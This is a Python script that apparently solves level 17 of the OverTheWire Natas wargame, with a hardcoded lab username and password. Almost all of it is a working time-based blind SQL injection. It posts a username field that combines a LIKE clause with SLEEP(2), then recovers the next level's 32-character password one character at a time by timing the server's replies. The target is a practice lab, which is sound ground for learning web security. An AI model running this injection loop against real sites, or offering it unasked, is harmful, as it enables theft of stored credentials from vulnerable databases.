#!/usr/bin/env python3

import requests
import re
from string import *
from time import *

characters = ascii_letters + digits

username = 'natas17'
password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'

url = 'http://%s.natas.labs.overthewire.org/' %username

session = requests.Session()
#response = session.get(url, auth = (username, password))

seen_password = list()
while(len(seen_password) < 32):
    for ch in characters:
        begin = time()
        response = session.post(url, data = {"username" : 'natas18" AND BINARY password LIKE"' + "".join(seen_password) + ch + '%" AND SLEEP(2)#'}, auth = (username, password))
        end = time()
        diferenca = end - begin
        print( str(len(seen_password)) + "/32 - Testando " + "".join(seen_password) + ch + "\t" + str(diferenca))

        if(diferenca > 1):
            seen_password.append(ch)
            break
print("".join(seen_password))
